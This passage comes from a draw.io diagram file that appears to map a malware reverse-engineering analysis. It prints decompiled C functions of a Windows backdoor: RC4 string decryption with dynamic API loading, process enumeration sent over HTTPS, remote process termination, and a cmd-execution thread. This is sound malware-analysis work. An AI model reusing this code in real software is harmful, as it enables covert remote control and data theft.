0x1Eu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)&amp;amp;unk_407428, 0x20u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aQ, 0x27u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)&amp;amp;unk_4071D4, 4u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)&amp;amp;unk_4071D8, 5u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)&amp;amp;unk_4071E0, 9u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aPxE77y, 0xFu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aSv, 4u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)LibFileName, 0xCu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)aXg_4, 0xEu);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)XG, 0x13u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)MEMORY[0x407158], 0x11u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)Y_, 0x11u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)MEMORY[0x407180], 0x11u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)MEMORY[0x407194], 0x15u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)MEMORY[0x4071AC], 0x11u);&lt;br&gt;&amp;nbsp; RC4_Cipher_Processing(cipherBuffer, (int)MEMORY[0x4071C0], 0x14u);&lt;/font&gt;&lt;br&gt;&amp;nbsp; loadedLibraryModule = LoadLibraryA(LibFileName);&lt;br&gt;&amp;nbsp; *(_DWORD *)(cipherBuffer + 36) = loadedLibraryModule;&lt;br&gt;&amp;nbsp; if ( loadedLibraryModule )&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 4) = GetProcAddress(loadedLibraryModule, aXg_4);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; procAddress = GetProcAddress(*(HMODULE *)(cipherBuffer + 36), XG);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; loadedLibraryModule_Copy1 = *(HMODULE *)(cipherBuffer + 36);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 8) = procAddress;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; procAddress_1 = GetProcAddress(loadedLibraryModule_Copy1, MEMORY[0x407158]);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; loadedLibraryModule_Copy2 = *(HMODULE *)(cipherBuffer + 36);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 12) = procAddress_1;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 16) = GetProcAddress(loadedLibraryModule_Copy2, Y_);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; procAddress_2 = GetProcAddress(*(HMODULE *)(cipherBuffer + 36), MEMORY[0x407180]);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; loadedLibraryModule_Copy3 = *(HMODULE *)(cipherBuffer + 36);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 20) = procAddress_2;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; procAddress_3 = GetProcAddress(loadedLibraryModule_Copy3, MEMORY[0x407194]);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; loadedLibraryModule_Copy4 = *(HMODULE *)(cipherBuffer + 36);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 24) = procAddress_3;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 32) = GetProcAddress(loadedLibraryModule_Copy4, MEMORY[0x4071AC]);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; *(_DWORD *)(cipherBuffer + 28) = GetProcAddress(*(HMODULE *)(cipherBuffer + 36), MEMORY[0x4071C0]);&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;nbsp; return cipherBuffer;&lt;br&gt;}" style="text;html=1;whiteSpace=wrap;overflow=hidden;rounded=0;" parent="1" vertex="1">
          <mxGeometry x="1448.86" y="393" width="591.14" height="992.55" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-16" value="&lt;h1 align=&quot;left&quot;&gt;&lt;font color=&quot;#ff8b26&quot;&gt;&lt;b&gt;Function 2: sub_402510() (RC4DecryptAndLoadProcedures):&lt;/b&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;html=1;align=left;verticalAlign=middle;whiteSpace=wrap;rounded=0;" parent="1" vertex="1">
          <mxGeometry x="1440" y="330" width="598" height="30" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-17" value="unsigned int __thiscall RC4_Cipher_Processing(int cipherBuffer, int encodedString, unsigned int input_length)&#xa;{&#xa;  int i; // edx&#xa;  unsigned int output; // eax&#xa;  int j; // ebp&#xa;  unsigned __int8 temp_byte; // cl&#xa;  _BYTE state[128]; // [esp+10h] [ebp-80h] BYREF&#xa;&#xa;  i = 0;&#xa;  output = 0;&#xa;  qmemcpy(state, (const void *)(cipherBuffer + 40), sizeof(state));&#xa;  j = 0;&#xa;  if ( input_length )&#xa;  {&#xa;    do&#xa;    {&#xa;      i = (i + 1) % 128;&#xa;      temp_byte = state[i];&#xa;      j = (temp_byte + j) % 128;&#xa;      state[i] = state[j];&#xa;      state[j] = temp_byte;&#xa;      *(_BYTE *)(output + encodedString) ^= state[(temp_byte + (unsigned __int8)state[i]) % 128];&#xa;      ++output;&#xa;    }&#xa;    while ( output &lt; input_length );&#xa;  }&#xa;  return output;&#xa;}" style="text;whiteSpace=wrap;" parent="1" vertex="1">
          <mxGeometry x="2180" y="780" width="560" height="440" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-20" value="&lt;h1&gt;&lt;font color=&quot;#ff8b26&quot;&gt;Function 2.1: sub_4028A0() (RC4_Cipher_Processing):&lt;/font&gt;&lt;/h1&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" parent="1" vertex="1">
          <mxGeometry x="2139" y="728" width="643" height="30" as="geometry" />
        </mxCell>
        <mxCell id="IVjEpb5pE-T4-foRiEZy-30" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.25;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" parent="1" source="IVjEpb5pE-T4-foRiEZy-6" target="IVjEpb5pE-T4-foRiEZy-18" edge="1">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-3" value="void __stdcall FillSystemInfo(LPSYSTEM_INFO lpSystemInfo)&#xa;{&#xa;  HMODULE ModuleHandleW; // eax&#xa;  void (__stdcall *GetNativeSystemInfo)(LPSYSTEM_INFO); // eax&#xa;&#xa;  if ( lpSystemInfo )&#xa;  {&#xa;    ModuleHandleW = GetModuleHandleW(ModuleName);&#xa;    GetNativeSystemInfo = (void (__stdcall *)(LPSYSTEM_INFO))GetProcAddress(ModuleHandleW, ::GetNativeSystemInfo);&#xa;    if ( GetNativeSystemInfo )&#xa;      GetNativeSystemInfo(lpSystemInfo);&#xa;    else&#xa;      GetSystemInfo(lpSystemInfo);&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="-1890" y="3550" width="340" height="250" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-5" value="BOOL isX64orIPFArchitecture()&#xa;{&#xa;  struct _SYSTEM_INFO v1; // [esp+0h] [ebp-24h] BYREF&#xa;&#xa;  FillSystemInfo(&amp;v1);&#xa;  return v1.wProcessorArchitecture == 9 || v1.wProcessorArchitecture == 6;&#xa;}" style="text;whiteSpace=wrap;fontColor=default;" vertex="1" parent="1">
          <mxGeometry x="-1885" y="3230" width="370" height="120" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-6" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;Function 4.4: sub_403360() (FillSystemInfo):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-1880" y="3460" width="340" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-8" value="&lt;h1&gt;&lt;font color=&quot;#47e7ff&quot;&gt;Function 4.3: sub_403360() (isX64orIPFArchitecture):&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-1875" y="3140" width="340" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-17" value="void __cdecl pause_for_random_time(int a1)&#xa;{&#xa;  int v1; // eax&#xa;&#xa;  v1 = rand();&#xa;  Sleep(a1 + v1 % 6000);&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="455" y="4630" width="270" height="120" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-18" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 9.1: sub_4024B0() (pause_for_random_time)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="435" y="4520" width="320" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-22" value="BOOL CollectAndSendProcessInformation()&#xa;{&#xa;  HANDLE processSnapshot; // ebx&#xa;  int offset; // ebx&#xa;  DWORD *processIdBuffer; // ebp&#xa;  DWORD *parentIdBuffer; // ebp&#xa;  size_t exeFileNameLength; // eax&#xa;  DWORD *exeFileBuffer; // edi&#xa;  int bufferSize; // ebx&#xa;  unsigned int *moduleFileNameLengthBuffer; // ebp&#xa;  HANDLE processHandle; // esi&#xa;  unsigned int moduleFileNameLength; // eax&#xa;  char *moduleFileNameBuffer; // ebp&#xa;  int processCount; // edi&#xa;  unsigned int stackSize; // [esp-8h] [ebp-7C58h]&#xa;  int processCounter; // [esp+Ch] [ebp-7C44h]&#xa;  int processModule; // [esp+10h] [ebp-7C40h] BYREF&#xa;  HANDLE snapshotHandle; // [esp+14h] [ebp-7C3Ch]&#xa;  int requiredBufferSize; // [esp+18h] [ebp-7C38h] BYREF&#xa;  PROCESSENTRY32W processEntry; // [esp+1Ch] [ebp-7C34h] BYREF&#xa;  wchar_t moduleFilePathBuffer[260]; // [esp+248h] [ebp-7A08h] BYREF&#xa;  _BYTE processInfoBuffer[30717]; // [esp+450h] [ebp-7800h] BYREF&#xa;  __int16 unusedByte; // [esp+7C4Dh] [ebp-3h]&#xa;  char anotherUnusedByte; // [esp+7C4Fh] [ebp-1h]&#xa;&#xa;  memset(&amp;processEntry.cntUsage, 0, 0x228u);&#xa;  processCounter = 0;&#xa;  processSnapshot = CreateProcessSnapshot(2u, 0);&#xa;  memset(processInfoBuffer, 0, sizeof(processInfoBuffer));&#xa;  snapshotHandle = processSnapshot;&#xa;  unusedByte = 0;&#xa;  anotherUnusedByte = 0;&#xa;  processEntry.dwSize = 556;&#xa;  if ( RetrieveFirstProcessInformation(processSnapshot, &amp;processEntry) )&#xa;  {&#xa;    processModule = 0;&#xa;    requiredBufferSize = 0;&#xa;    offset = 4;&#xa;    processIdBuffer = (DWORD *)&amp;processInfoBuffer[4];&#xa;    do&#xa;    {&#xa;      *processIdBuffer = processEntry.th32ProcessID;&#xa;      parentIdBuffer = processIdBuffer + 1;&#xa;      *parentIdBuffer++ = processEntry.th32ParentProcessID;&#xa;      exeFileNameLength = 2 * wcslen(processEntry.szExeFile);&#xa;      *parentIdBuffer++ = exeFileNameLength;&#xa;      qmemcpy(parentIdBuffer, processEntry.szExeFile, 4 * (exeFileNameLength &gt;&gt; 2));&#xa;      exeFileBuffer = &amp;parentIdBuffer[exeFileNameLength &gt;&gt; 2];&#xa;      bufferSize = offset + exeFileNameLength + 12;&#xa;      moduleFileNameLengthBuffer = (DWORD *)((char *)parentIdBuffer + exeFileNameLength);&#xa;      qmemcpy(exeFileBuffer, &amp;processEntry.szExeFile[2 * (exeFileNameLength &gt;&gt; 2)], exeFileNameLength &amp; 3);&#xa;      memset(moduleFilePathBuffer, 0, sizeof(moduleFilePathBuffer));&#xa;      processHandle = OpenProcess(0x410u, 0, processEntry.th32ProcessID);&#xa;      if ( EnumerateProcessModules((int)processHandle, (int)&amp;processModule, 4, (int)&amp;requiredBufferSize) )&#xa;        GetModuleFilePath((int)processHandle, processModule, (int)moduleFilePathBuffer, 260);&#xa;      else&#xa;        GetExecFileNameForProcess((int)processHandle, (int)moduleFilePathBuffer, 260);&#xa;      moduleFileNameLength = 2 * wcslen(moduleFilePathBuffer);&#xa;      *moduleFileNameLengthBuffer = moduleFileNameLength;&#xa;      moduleFileNameBuffer = (char *)(moduleFileNameLengthBuffer + 1);&#xa;      qmemcpy(moduleFileNameBuffer, moduleFilePathBuffer, moduleFileNameLength);&#xa;      offset = bufferSize + moduleFileNameLength + 4;&#xa;      processIdBuffer = (DWORD *)&amp;moduleFileNameBuffer[moduleFileNameLength];&#xa;      processCount = ++processCounter;&#xa;    }&#xa;    while ( GetNextProcessFromSnapshot(snapshotHandle, &amp;processEntry) );&#xa;    stackSize = STACK[0x7E60];&#xa;    *(_DWORD *)processInfoBuffer = processCount;&#xa;    ((void (__stdcall *)(_BYTE *, int, int, char *, unsigned int))secureDataTransmission)(&#xa;      processInfoBuffer,&#xa;      offset,&#xa;      4,&#xa;      socketFlag,&#xa;      stackSize);&#xa;    processSnapshot = snapshotHandle;&#xa;  }&#xa;  return CloseHandle(processSnapshot);&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="655" y="6760" width="560" height="1180" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-24" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 10: sub_4040F0() (secureDataTransmission)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="670" y="6670" width="530" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-25" value="BOOL __thiscall secureDataRequest(&#xa;        int (__stdcall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD),&#xa;        int actionParam,&#xa;        int connectParam,&#xa;        int sslParam,&#xa;        int dataParam,&#xa;        int srcDataSize)&#xa;{&#xa;  int (__stdcall **v6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // esi&#xa;  int connectionHandle; // edi&#xa;  int connectResult; // eax&#xa;  int connectCode; // ebx&#xa;  int actionResult; // ebp&#xa;  int bufferSize; // ebx&#xa;  char *bufferPtr; // edi&#xa;  int timeoutValue; // [esp+B0h] [ebp-414h] BYREF&#xa;  int connectionCode; // [esp+B4h] [ebp-410h]&#xa;  int bytesRead; // [esp+B8h] [ebp-40Ch] BYREF&#xa;  int sslFlags; // [esp+BCh] [ebp-408h] BYREF&#xa;  int flagSize; // [esp+C0h] [ebp-404h] BYREF&#xa;  char buffer[1021]; // [esp+C4h] [ebp-400h] BYREF&#xa;  __int16 byte1; // [esp+4C1h] [ebp-3h]&#xa;  char byte2; // [esp+4C3h] [ebp-1h]&#xa;&#xa;  v6 = this;&#xa;  connectionHandle = this[1](0, 0, 0, 0, 0);&#xa;  connectionCode = connectionHandle;&#xa;  if ( connectionHandle )&#xa;  {&#xa;    timeoutValue = 10000;&#xa;    if ( ((int (__stdcall *)(int, int, int *, int))v6[2])(connectionHandle, 2, &amp;timeoutValue, 4) )&#xa;    {&#xa;      connectResult = ((int (__stdcall *)(int, int, int, _DWORD, _DWORD, int, _DWORD, _DWORD))v6[3])(&#xa;                        connectionHandle,&#xa;                        connectParam,&#xa;                        443,&#xa;                        0,&#xa;                        0,&#xa;                        3,&#xa;                        0,&#xa;                        0);&#xa;      connectCode = connectResult;&#xa;      timeoutValue = connectResult;&#xa;      if ( connectResult )&#xa;      {&#xa;        actionResult = ((int (__stdcall *)(int, void *, int, void *, _DWORD, _DWORD, int, _DWORD))v6[4])(&#xa;                         connectResult,&#xa;                         &amp;unk_4071D8,&#xa;                         sslParam,&#xa;                         &amp;unk_4071E0,&#xa;                         0,&#xa;                         0,&#xa;                         13119488,&#xa;                         0);&#xa;        if ( actionResult )&#xa;        {&#xa;          if ( v6[5](actionResult, actionParam, -1, dataParam, srcDataSize)&#xa;            || GetLastError() == 12045&#xa;            &amp;&amp; (flagSize = 4,&#xa;                ((void (__stdcall *)(int, int, int *, int *))v6[6])(actionResult, 31, &amp;sslFlags, &amp;flagSize),&#xa;                sslFlags |= 0x180u,&#xa;                ((void (__stdcall *)(int, int, int *, int))v6[2])(actionResult, 31, &amp;sslFlags, 4),&#xa;                v6[5](actionResult, actionParam, -1, dataParam, srcDataSize)) )&#xa;          {&#xa;            memset(buffer, 0, sizeof(buffer));&#xa;            byte1 = 0;&#xa;            byte2 = 0;&#xa;            bytesRead = 0;&#xa;            bufferSize = 1024;&#xa;            bufferPtr = buffer;&#xa;            while ( 1 )&#xa;            {&#xa;              Sleep(0x64u);&#xa;              bufferPtr += bytesRead;&#xa;              if ( !((int (__stdcall *)(int, char *, int, int *))v6[8])(actionResult, bufferPtr, bufferSize, &amp;bytesRead) )&#xa;              {&#xa;                GetLastError();&#xa;                ((void (__stdcall *)(int))v6[7])(connectionCode);&#xa;                ((void (__stdcall *)(int))v6[7])(timeoutValue);&#xa;                ((void (__stdcall *)(int))v6[7])(actionResult);&#xa;                return 0;&#xa;              }&#xa;              if ( !bytesRead )&#xa;                break;&#xa;              bufferSize -= bytesRead;&#xa;            }&#xa;            ((void (__stdcall *)(int))v6[7])(actionResult);&#xa;            ((void (__stdcall *)(int))v6[7])(timeoutValue);&#xa;            ((void (__stdcall *)(int))v6[7])(connectionCode);&#xa;            return strcmp(buffer, success) == 0;&#xa;          }&#xa;          else&#xa;          {&#xa;            ((void (__stdcall *)(int))v6[7])(connectionCode);&#xa;            ((void (__stdcall *)(int))v6[7])(timeoutValue);&#xa;            ((void (__stdcall *)(int))v6[7])(actionResult);&#xa;            return 0;&#xa;          }&#xa;        }&#xa;        else&#xa;        {&#xa;          GetLastError();&#xa;          ((void (__stdcall *)(int))v6[7])(connectionHandle);&#xa;          ((void (__stdcall *)(int))v6[7])(connectCode);&#xa;          ((void (__stdcall *)(_DWORD))v6[7])(0);&#xa;          return 0;&#xa;        }&#xa;      }&#xa;      else&#xa;      {&#xa;        GetLastError();&#xa;        ((void (__stdcall *)(int))v6[7])(connectionHandle);&#xa;        ((void (__stdcall *)(_DWORD))v6[7])(0);&#xa;        return 0;&#xa;      }&#xa;    }&#xa;    else&#xa;    {&#xa;      GetLastError();&#xa;      ((void (__stdcall *)(int))v6[7])(connectionHandle);&#xa;      return 0;&#xa;    }&#xa;  }&#xa;  else&#xa;  {&#xa;    GetLastError();&#xa;    ((void (__stdcall *)(_DWORD))v6[7])(0);&#xa;    return 0;&#xa;  }&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="1375" y="7170" width="560" height="480" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-29" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 10.2: sub_4036C0() (secureDataRequest)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="1375" y="7090" width="595" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-32" value="int __stdcall format_and_append_to_buffer(char *Buffer, int a2, const char *a3)&#xa;{&#xa;  int result; // eax&#xa;&#xa;  sprintf(Buffer, YF, a2);&#xa;  strcat(Buffer, aRf8t69mIWm);&#xa;  strcat(Buffer, aPj);&#xa;  if ( strlen(a3) )&#xa;  {&#xa;    strcat(Buffer, Referer);&#xa;    strcat(Buffer, a3);&#xa;    strcat(Buffer, asc_407478);&#xa;  }&#xa;  result = 0;&#xa;  strcat(Buffer, aDz);&#xa;  strcat(Buffer, aRfT9W);&#xa;  strcat(Buffer, aPj_0);&#xa;  strcat(Buffer, aPj_1);&#xa;  return result;&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="150" y="8140" width="460" height="310" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-34" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 10.1: sub_402D40() (format_and_append_to_buffer)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="115" y="8040" width="595" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-37" value="BOOL CollectAndSendProcessInformation()&#xa;{&#xa;  HANDLE processSnapshot; // ebx&#xa;  int offset; // ebx&#xa;  DWORD *processIdBuffer; // ebp&#xa;  DWORD *parentIdBuffer; // ebp&#xa;  size_t exeFileNameLength; // eax&#xa;  DWORD *exeFileBuffer; // edi&#xa;  int bufferSize; // ebx&#xa;  unsigned int *moduleFileNameLengthBuffer; // ebp&#xa;  HANDLE processHandle; // esi&#xa;  unsigned int moduleFileNameLength; // eax&#xa;  char *moduleFileNameBuffer; // ebp&#xa;  int processCount; // edi&#xa;  unsigned int stackSize; // [esp-8h] [ebp-7C58h]&#xa;  int processCounter; // [esp+Ch] [ebp-7C44h]&#xa;  int processModule; // [esp+10h] [ebp-7C40h] BYREF&#xa;  HANDLE snapshotHandle; // [esp+14h] [ebp-7C3Ch]&#xa;  int requiredBufferSize; // [esp+18h] [ebp-7C38h] BYREF&#xa;  PROCESSENTRY32W processEntry; // [esp+1Ch] [ebp-7C34h] BYREF&#xa;  wchar_t moduleFilePathBuffer[260]; // [esp+248h] [ebp-7A08h] BYREF&#xa;  _BYTE processInfoBuffer[30717]; // [esp+450h] [ebp-7800h] BYREF&#xa;  __int16 unusedByte; // [esp+7C4Dh] [ebp-3h]&#xa;  char anotherUnusedByte; // [esp+7C4Fh] [ebp-1h]&#xa;&#xa;  memset(&amp;processEntry.cntUsage, 0, 0x228u);&#xa;  processCounter = 0;&#xa;  processSnapshot = CreateProcessSnapshot(2u, 0);&#xa;  memset(processInfoBuffer, 0, sizeof(processInfoBuffer));&#xa;  snapshotHandle = processSnapshot;&#xa;  unusedByte = 0;&#xa;  anotherUnusedByte = 0;&#xa;  processEntry.dwSize = 556;&#xa;  if ( RetrieveFirstProcessInformation(processSnapshot, &amp;processEntry) )&#xa;  {&#xa;    processModule = 0;&#xa;    requiredBufferSize = 0;&#xa;    offset = 4;&#xa;    processIdBuffer = (DWORD *)&amp;processInfoBuffer[4];&#xa;    do&#xa;    {&#xa;      *processIdBuffer = processEntry.th32ProcessID;&#xa;      parentIdBuffer = processIdBuffer + 1;&#xa;      *parentIdBuffer++ = processEntry.th32ParentProcessID;&#xa;      exeFileNameLength = 2 * wcslen(processEntry.szExeFile);&#xa;      *parentIdBuffer++ = exeFileNameLength;&#xa;      qmemcpy(parentIdBuffer, processEntry.szExeFile, 4 * (exeFileNameLength &gt;&gt; 2));&#xa;      exeFileBuffer = &amp;parentIdBuffer[exeFileNameLength &gt;&gt; 2];&#xa;      bufferSize = offset + exeFileNameLength + 12;&#xa;      moduleFileNameLengthBuffer = (DWORD *)((char *)parentIdBuffer + exeFileNameLength);&#xa;      qmemcpy(exeFileBuffer, &amp;processEntry.szExeFile[2 * (exeFileNameLength &gt;&gt; 2)], exeFileNameLength &amp; 3);&#xa;      memset(moduleFilePathBuffer, 0, sizeof(moduleFilePathBuffer));&#xa;      processHandle = OpenProcess(0x410u, 0, processEntry.th32ProcessID);&#xa;      if ( EnumerateProcessModules((int)processHandle, (int)&amp;processModule, 4, (int)&amp;requiredBufferSize) )&#xa;        GetModuleFilePath((int)processHandle, processModule, (int)moduleFilePathBuffer, 260);&#xa;      else&#xa;        GetExecFileNameForProcess((int)processHandle, (int)moduleFilePathBuffer, 260);&#xa;      moduleFileNameLength = 2 * wcslen(moduleFilePathBuffer);&#xa;      *moduleFileNameLengthBuffer = moduleFileNameLength;&#xa;      moduleFileNameBuffer = (char *)(moduleFileNameLengthBuffer + 1);&#xa;      qmemcpy(moduleFileNameBuffer, moduleFilePathBuffer, moduleFileNameLength);&#xa;      offset = bufferSize + moduleFileNameLength + 4;&#xa;      processIdBuffer = (DWORD *)&amp;moduleFileNameBuffer[moduleFileNameLength];&#xa;      processCount = ++processCounter;&#xa;    }&#xa;    while ( GetNextProcessFromSnapshot(snapshotHandle, &amp;processEntry) );&#xa;    stackSize = STACK[0x7E60];&#xa;    *(_DWORD *)processInfoBuffer = processCount;&#xa;    ((void (__stdcall *)(_BYTE *, int, int, char *, unsigned int))secureDataTransmission)(&#xa;      processInfoBuffer,&#xa;      offset,&#xa;      4,&#xa;      socketFlag,&#xa;      stackSize);&#xa;    processSnapshot = snapshotHandle;&#xa;  }&#xa;  return CloseHandle(processSnapshot);&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="1850" y="4960" width="560" height="1180" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-39" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 9.1: sub_401F20() (CollectAndSendProcessInformation)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="1840" y="4860" width="530" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-43" value="BOOL __cdecl TerminateProcessAndSendStatus(&#xa;        int unusedParameter1,&#xa;        int unusedParameter2,&#xa;        int unusedParameter3,&#xa;        DWORD targetProcessId)&#xa;{&#xa;  HANDLE processHandle; // eax&#xa;  void *processHandleCopy; // esi&#xa;  int terminationStatus; // [esp+4h] [ebp-4h] BYREF&#xa;&#xa;  terminationStatus = 0;&#xa;  processHandle = OpenProcess(0x1F0FFFu, 0, targetProcessId);&#xa;  processHandleCopy = processHandle;&#xa;  if ( processHandle &amp;&amp; TerminateProcess(processHandle, 0) )&#xa;    terminationStatus = 1;&#xa;  secureDataTransmission(&#xa;    (int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dataBuffer,&#xa;    &amp;terminationStatus,&#xa;    4u,&#xa;    5,&#xa;    (int)socketFlag,&#xa;    (const char *)STACK[0x218]);&#xa;  return CloseHandle(processHandleCopy);&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="990" y="5470" width="490" height="370" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-48" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 9.3: sub_4020E0() (TerminateProcessAndSendStatus)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="990" y="5380" width="530" height="70" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-50" value="void CreateThreadForCmd()&#xa;{&#xa;  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+0h] [ebp-Ch] BYREF&#xa;&#xa;  PipeAttributes.nLength = 12;&#xa;  PipeAttributes.lpSecurityDescriptor = 0;&#xa;  PipeAttributes.bInheritHandle = 1;&#xa;  CreatePipe((PHANDLE)&amp;hObject, (PHANDLE)&amp;hWritePipe, &amp;PipeAttributes, 0);&#xa;  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ExecuteCmdWithMonitoring, (LPVOID)STACK[0x21C], 0, 0);&#xa;  Sleep(0x1F4u);&#xa;}" style="text;whiteSpace=wrap;" vertex="1" parent="1">
          <mxGeometry x="240.5" y="5540" width="560" height="200" as="geometry" />
        </mxCell>
        <mxCell id="M72Y2Jye1D7dT9Ai017H-51" value="&lt;h1&gt;&lt;font color=&quot;#ff0505&quot;&gt;Function 9.4: sub_402150() (CreateThreadForCmd)&lt;br&gt;&lt;/font&gt;&lt;/h1&gt;" style="text;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="270" y="5420" width="530" height="70" as="geometry" />
        </mxCell>
